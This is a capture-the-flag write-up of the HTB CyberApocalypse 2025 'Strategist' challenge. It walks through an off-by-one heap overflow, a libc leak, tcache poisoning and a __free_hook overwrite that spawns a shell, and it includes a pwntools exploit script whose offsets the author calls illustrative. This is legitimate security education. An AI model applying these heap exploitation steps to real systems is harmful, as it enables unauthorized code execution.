---
title: "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning"
description: "Detailed analysis of the HTB CyberApocalypse 2025 'Strategist' pwn challenge, demonstrating an off-by-one heap overflow leading to Tcache poisoning and code execution."
date: "2025-05-01" # Updated date
categories: [pwn, cyberapocalypse2025, heap]
---

# Heap Exploitation Deep Dive: Tcache Poisoning via Off-by-One in 'Strategist'

Heap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores heap exploitation techniques using the `strategist` challenge from Hack The Box CyberApocalypse 2025 (March 21-26) as a case study. We'll examine how an off-by-one heap overflow vulnerability discovered in the binary was leveraged to perform a Tcache poisoning attack, ultimately leading to arbitrary code execution by overwriting `__free_hook`.

## Challenge Description and Context

The challenge presented the `strategist` binary and remote access, setting the scene with:

> "To move forward, Sir Alaric requests each member of his team to present their most effective planning strategy. The individual with the strongest plan will be appointed as the Strategist for the upcoming war. Put forth your best effort to claim the role of Strategist!"

The binary allows managing "plans" via dynamic memory allocation (`malloc`, `free`, etc.). Security mitigations present a typical modern challenge:

```text
[*] './strategist'
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'./glibc/'
Stripped:   No
```
Full RELRO prevents easy GOT overwrites, PIE necessitates an information leak (like a libc address), and NX prevents executing shellcode directly on the stack or heap. The core vulnerability lies in the `edit_plan` functionality.

## Vulnerability: Off-by-One Heap Overflow -> Metadata Corruption

The `edit_plan` function determines the number of bytes to read for updating a plan based on the `strlen` of the *current* content of that plan's chunk. It then reads exactly that many bytes using the `read` syscall.

```c
// Simplified C representation of vulnerable edit logic
uint64_t nbytes = strlen(*(char **)(plan_array_ptr + (long)plan_index * 8)); // Get length of CURRENT content
read(0, *(void **)(plan_array_ptr + (long)plan_index * 8), nbytes); // Read EXACTLY nbytes
```

**The Flaw:** The `read` syscall does *not* append a null terminator. If the user provides input such that `strlen` returns the exact capacity of the user data area for a given chunk (e.g., 0x28 bytes for a chunk allocated with `malloc(0x28)`), the subsequent `read` call will write exactly 0x28 bytes. This write operation overwrites the allocated buffer *and* the single byte immediately following it in memory.

**Metadata Impact:** In `glibc`'s heap (`ptmalloc`), chunks allocated via `malloc` are often laid out contiguously. Directly following Chunk A's user data area is the metadata header for the next adjacent chunk (Chunk B). This header contains fields like the chunk's size. The off-by-one write from editing Chunk A can therefore corrupt the metadata of Chunk B, specifically overwriting the Least Significant Byte (LSB) of its size field.

**Demonstration (Heap Dumps):**
Let's visualize this using `gef` heap dumps from the analysis process. Assume Chunk A (data `XXXX...`) and Chunk B (data `YYYY...`) are adjacent, both allocated with size 0x28 (metadata size field `0x31` including the PREV_INUSE flag).

*Heap Before Overflow:*
```text
gef>  x/20xg <address_of_chunk_A_metadata>
# ... (Chunk A metadata header, size 0x31) ...
0x...e6a0: 0x5858585858585858  0x5858585858585858  <- Chunk A User Data (XXXX...)
0x...e6b0: 0x5858585858585858  0x5858585858585858
0x...e6c0: 0x0000000000000000  0x0000000000000031  <- Chunk B Metadata Header (Size=0x31)
0x...e6d0: 0x5959595959595959  0x5959595959595959  <- Chunk B User Data (YYYY...)
# ...
```

*Heap After Editing Chunk A with 0x28 'A's (no null terminator):*
```text
gef>  x/20xg <address_of_chunk_A_metadata>
# ... (Chunk A metadata header, size 0x31) ...
0x...e6a0: 0x4141414141414141  0x4141414141414141  <- Chunk A User Data (AAAA...)
0x...e6b0: 0x4141414141414141  0x4141414141414141
0x...e6c0: 0x4141414141414141  0x0000000000000041  <- Chunk B Metadata Header (Size CORRUPTED: 0x31 -> 0x41)
0x...e6d0: 0x5959595959595959  0x5959595959595959  <- Chunk B User Data (YYYY...)
# ...
```
The last 'A' written overflowed by one byte, changing the size field at `0x...e6c8` from `0x31` to `0x41`. By controlling this last byte (e.g., sending `0x27 * 'A' + '\x91'`), we can set the corrupted size precisely (e.g., to `0x91`). This corruption is crucial because it can bypass heap consistency checks performed by `free` and interfere with chunk consolidation logic.

## Heap Concepts for Exploitation

Exploiting this requires understanding relevant `glibc` heap mechanisms (particularly relevant for versions >= 2.26 which introduced Tcache):

* **Tcache (Thread-Local Cache):**
    * A performance optimization providing per-thread caches for recently freed small chunks (typically up to size 0x408).
    * Consists of multiple bins, each holding chunks of a specific size.
    * Each bin is a singly-linked LIFO (Last-In, First-Out) list, using the `fd` (forward) pointer within the freed chunk's user data area to point to the next entry.
    * A bin can hold a maximum of 7 chunks.
    * `malloc` checks the corresponding Tcache bin first before resorting to other bins or requesting memory from the system.
    * Crucially, Tcache prioritizes speed and has *fewer security checks* compared to older bins, making it vulnerable to attacks like double-free, use-after-free, and poisoning of the `fd` pointer.

* **Unsorted Bin:**
    * Acts as a central, temporary cache (a global, doubly-linked list using `fd` and `bk` pointers) for freed chunks that don't immediately go into Tcache (e.g., they are too large, or the relevant Tcache bin is full).
    * Chunks are processed later from the unsorted bin â€“ they might be consolidated with adjacent free chunks or moved to appropriate small/large bins.
    * **Libc Leak Source:** While a chunk resides in the unsorted bin, its `fd` and `bk` pointers point into the `main_arena` structure within `libc`. If an attacker can read the contents of a chunk *after* it has been placed in the unsorted bin (e.g., by partially reallocating it), these pointers can be leaked, revealing runtime addresses within `libc` and defeating ASLR for the library.

* **Tcache Poisoning Attack:**
    * The core technique used in this exploit.
    * Leverages a vulnerability (like our off-by-one, or others like use-after-free/double-free) to overwrite the `fd` pointer of a chunk currently residing in a Tcache bin's free list.
    * The attacker overwrites the `fd` pointer with the address of a target location (e.g., `&__free_hook`, a GOT entry, or another sensitive address).
    * When `malloc` is subsequently called for that chunk size, it will:
        1.  Return the first chunk from the Tcache bin (the one whose `fd` pointer was overwritten).
        2.  On the *next* `malloc` call for the same size, follow the *poisoned* `fd` pointer and return the attacker-chosen target address.
    * This effectively gives the attacker a write-what-where primitive: `malloc` returns a pointer to the target, and subsequent input/editing can write arbitrary data there.

## Exploitation Method Walkthrough (Tcache Poisoning)

The exploit combines the off-by-one, Unsorted Bin leak, and Tcache poisoning:

1.  **Leaking a Libc Address (Unsorted Bin Attack):**
    * a. Allocate a large chunk (L), sized specifically so it won't fit in Tcache (e.g., > 0x410 bytes).
    * b. Allocate a small "barrier" chunk immediately after L. This prevents L from merging with the wilderness (top chunk) when freed.
    * c. `free(L)`. Since L is large, it's placed into the Unsorted Bin. Its `fd` and `bk` pointers now point into `libc`'s `main_arena`.
    * d. Allocate a new small chunk (S). `malloc` often satisfies small requests by splitting larger chunks from the Unsorted Bin. When L is split, the `main_arena` pointer (originally in `L->fd`) is copied into the user data area of the newly allocated chunk S.
    * e. Use the program's `show` functionality to read the contents of S. Extract the leaked `main_arena` pointer. Calculate the `libc` base address by subtracting the known offset of `main_arena` (relative to the leak point) from the leaked address. This defeats ASLR for `libc`, giving us the runtime addresses of `system`, `__free_hook`, etc.

2.  **Heap Setup and Metadata Corruption:**
    * a. Allocate several small chunks with distinct patterns (e.g., A(0x28, 'AAAA'), B(0x18, '/bin/sh\x00'), C(0x28, 'CCCC'), D(0x18, 'DDDD')). This careful setup arranges the heap for the Tcache manipulation and makes debugging easier.
    * b. Trigger the **Off-by-One Vulnerability**: Use the `edit` function on chunk A. Provide exactly 0x28 bytes of input, ending with a carefully chosen byte (like `\x41` or `\x91`). This overwrites the LSB of the adjacent chunk B's size field, changing its size from `0x21` to `0x41` (or `0x91`). This corrupted size is important mainly to prevent `free` from attempting to consolidate B with adjacent chunks later, which could disrupt the Tcache state.

3.  **Tcache Manipulation and Hook Overwrite:**
    * a. Free chunks in a specific order to manipulate the Tcache lists. To target the Tcache[0x20] bin (for chunks of size 0x18 + metadata), a potential order is: `free(C)` (idx 3), `free(A)` (idx 1), `free(D)` (idx 4), then `free(B)` (idx 2). This sequence aims to place B (the chunk with the corrupted size field) at the head of the Tcache[0x20] list, with its `fd` pointing to the previously freed chunk D. State: `Tcache[0x20]: B(fd=&D) -> D -> NULL`.
    * b. **Poison the `fd` Pointer:** Allocate a new chunk (P), ensuring its size (e.g., 0x28) and position on the heap cause it to physically overlap the memory previously occupied by the now-freed chunk B. Write a payload into P consisting of padding followed by the target address: `[Padding] + p64(address_of___free_hook)`. The padding must be precisely calculated so that the `p64` write overwrites the memory location where B's `fd` pointer is stored within the Tcache metadata structure.
    * c. **Retrieve Target Address:** Allocate a chunk of size 0x18. `malloc` returns chunk B from the head of the Tcache[0x20] list. Allocate *another* chunk of size 0x18. `malloc` now follows the *poisoned* `fd` pointer (which points to `__free_hook`) and returns the address `&__free_hook`.
    * d. **Overwrite Hook:** The pointer returned by the second `malloc(0x18)` points directly to `__free_hook`. Use the program's `edit` functionality on the chunk associated with this pointer. Write the address of the `system` function (calculated using the leaked libc base) into this chunk. This directly overwrites the `__free_hook` function pointer itself with `&system`.

4.  **Triggering Code Execution:**
    * a. Free the chunk containing the command string "/bin/sh" (original chunk B, index 2 in our setup).
    * b. When `free()` is called, the `glibc` implementation first checks if `__free_hook` is non-NULL. Since we overwrote it with the address of `system`, the hook is called.
    * c. The hook (`system`) is called with the address of the chunk being freed (`B`, containing "/bin/sh") as its argument.
    * d. This results in the execution of `system("/bin/sh")`, spawning a shell and giving the attacker control.

## Exploit Code Snippet (Pwntools - Key Parts)

```python
#!/usr/bin/python3
from pwn import *

# --- Setup (Connect, ELF/Libc info) ---
context.arch = 'amd64'
context.log_level = 'info' # Use 'debug' for more verbose heap info
target = './strategist'
libc_path = './glibc/libc.so.6' # Adjust path to provided libc
# connection = remote(host, port) # For remote target
connection = process(target, env={"LD_PRELOAD": libc_path}) # For local testing
elf = ELF(target)
libc = ELF(libc_path)

# --- Helper Functions (create, show, edit, delete) ---
def create(size, data):
    connection.sendlineafter(b'> ', b'1')
    connection.sendlineafter(b'> ', str(size).encode())
    connection.sendafter(b'> ', data)

def show(idx):
    connection.sendlineafter(b'> ', b'2')
    connection.sendlineafter(b'> ', str(idx).encode())
    connection.recvuntil(f'Plan [{idx}]: '.encode())
    return connection.recvline()

def edit(idx, data):
    connection.sendlineafter(b'> ', b'3')
    connection.sendlineafter(b'> ', str(idx).encode())
    connection.sendafter(b'> ', data)

def delete(idx):
    connection.sendlineafter(b'> ', b'4')
    connection.sendlineafter(b'> ', str(idx).encode())
# --- End Helpers ---

# --- 1. Libc Leak (Unsorted Bin) ---
log.info("Performing Libc Leak via Unsorted Bin...")
create(0x418, b'L'*8)       # Idx 0: Large chunk (L)
create(0x18, b'Barrier'*2) # Idx 1: Barrier chunk
delete(0)                  # Free(L) -> goes to Unsorted Bin
create(0x18, b'S'*8)       # Idx 0: Reallocate small (S), gets split from L
leak_data = show(0).strip()
# Adjust parsing based on actual output structure if needed
leaked_addr = u64(leak_data[len(b'S'*8):].ljust(8, b'\x00'))
# Offset calculation depends heavily on libc version and leak point.
# This example assumes leak is main_arena + 1104 for libc 2.31
main_arena_offset = 1104
libc.address = leaked_addr - (libc.symbols['main_arena'] + main_arena_offset)
log.success(f"Libc base: {hex(libc.address)}")
log.info(f"System @ {hex(libc.symbols.system)}")
log.info(f"__free_hook @ {hex(libc.symbols.__free_hook)}")

# --- 2. Heap Setup & Metadata Corruption ---
log.info("Setting up heap and triggering off-by-one...")
create(0x28, b'A'*0x28)       # Idx 1: Chunk A (size 0x30)
create(0x18, b'/bin/sh\x00') # Idx 2: Chunk B (size 0x20) <- Holds command
create(0x28, b'C'*0x28)       # Idx 3: Chunk C (size 0x30)
create(0x18, b'D'*0x18)       # Idx 4: Chunk D (size 0x20) <- Dummy Tcache entry
# Trigger off-by-one by editing A (idx 1) to corrupt B's (idx 2) size LSB
# Use \x41 to change size 0x21 -> 0x41. \x91 would make it 0x91 etc.
edit(1, b'A' * 0x28 + b'\x41')
log.info("Chunk B's size potentially corrupted.")

# --- 3. Tcache Manipulation & Poisoning ---
log.info("Freeing chunks to prime Tcache[0x20] and poisoning...")
# Free order: C, A (fill Tcache[0x30]), D, B (fill Tcache[0x20])
delete(3) # Free C(idx 3) -> Tcache[0x30]
delete(1) # Free A(idx 1) -> Tcache[0x30]
delete(4) # Free D(idx 4) -> Tcache[0x20] = D -> NULL
delete(2) # Free B(idx 2) -> Tcache[0x20] = B -> D -> NULL

# Poison Write: Allocate chunk P (idx 1) overlapping B's old location.
# Payload must overwrite the memory where B->fd was stored.
# Padding calculation might be needed depending on exact chunk layout/libc.
# Assuming 0x18 bytes of padding reaches the fd pointer for a 0x28 chunk.
create(0x28, b'P'*0x18 + p64(libc.symbols.__free_hook)) # Poison B's fd
log.info("Tcache[0x20] poisoned: B->fd now points to __free_hook")

log.info("Allocating twice from Tcache[0x20]...")
# First allocation gets the space of chunk B
create(0x18, b'X'*8) # Idx 2: Re-allocates B's space
# Second allocation follows the poisoned fd pointer
# It returns a pointer to __free_hook, write system address there directly.
create(0x18, p64(libc.symbols.system)) # Idx 3: Allocates AT __free_hook, writes &system

log.info("__free_hook overwritten with system().")

# --- 4. Trigger Execution ---
log.info("Triggering hook by freeing chunk containing '/bin/sh'...")
# We need to free the chunk containing "/bin/sh".
# Find the current index of the chunk holding "/bin/sh".
# If original chunk B (idx 2) was overwritten by the 'X'*8 allocation,
# we need to use another chunk. Let's re-create it if needed.
# Assuming we need to create a new one:
create(0x18, b'/bin/sh\x00') # Idx 4: Ensure /bin/sh exists
delete(4) # Free this chunk -> system("/bin/sh") executed


# --- 5. Interact ---
log.success("Shell popped?")
connection.interactive()

```
*Note: Heap exploitation, especially involving Tcache, is highly sensitive to the `libc` version and the exact sequence of allocations/frees. The indices, sizes, padding, and offsets in the code snippet are illustrative based on common patterns and the provided analysis; they may require careful adjustment and debugging against the specific target environment using tools like `gdb` with `gef` or `pwndbg`.*

## Conclusion

This deep dive into the `strategist` challenge demonstrated how an off-by-one heap overflow, often considered a minor vulnerability, can be a powerful primitive for modern heap exploitation. By carefully corrupting metadata to interfere with heap management logic, leaking a `libc` address via the Unsorted Bin, and executing a Tcache poisoning attack, control over the `__free_hook` function pointer was gained, leading to arbitrary code execution. This process highlights the intricate nature of heap manipulation and the critical importance of understanding `glibc` heap allocator internals for identifying and exploiting such vulnerabilities.
